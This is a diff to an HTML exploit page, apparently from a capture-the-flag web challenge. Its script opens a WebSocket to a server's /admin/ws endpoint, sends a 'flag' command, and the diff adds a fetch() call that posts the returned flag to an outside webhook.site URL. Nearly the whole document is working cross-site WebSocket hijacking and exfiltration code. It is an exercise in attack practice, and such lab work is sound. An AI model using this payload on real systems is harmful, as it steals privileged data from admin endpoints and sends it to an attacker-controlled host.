@@ -3,20 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fetch Flag</title>
+    <title>Fetch Flag and Send to Webhook</title>
 </head>
 <body>
     <h1>Fetching the Flag...</h1>
     <div id="flag"></div>
 
     <script>
-        // Ensure WebSocket connection to the server's /admin/ws endpoint
-        const ws = new WebSocket('ws://ce441-web.spchallenge.ir:8080/admin/ws');
+        // Ensure WebSocket connection to the server's /admin/ws endpoint with the 'binary' subprotocol
+        const ws = new WebSocket('ws://web:8080/admin/ws', 'binary');
 
         // Once the WebSocket is open, send the 'flag' command to fetch the flag
         ws.onopen = function() {
             console.log('WebSocket connection established!');
-            ws.send('flag');
+            ws.send('flag');  // Send 'flag' command to request the flag
         };
 
         // Handle the response from the WebSocket (i.e., the flag)
@@ -24,8 +24,26 @@
             const message = event.data;
             console.log('Flag received:', message);
 
-            // Display the flag on the page (you could also send it back to your server)
+            // Display the flag on the page
             document.getElementById('flag').textContent = 'Flag: ' + message;
+
+            // Send the flag to the webhook
+            fetch('https://webhook.site/cd493d3b-ca76-4b9b-90f2-1e71569c7c98', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    flag: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Flag sent to webhook:', data);
+            })
+            .catch(error => {
+                console.error('Error sending flag to webhook:', error);
+            });
         };
 
         // Handle any errors that may occur with the WebSocket
@@ -40,4 +58,3 @@
     </script>
 </body>
 </html>
-
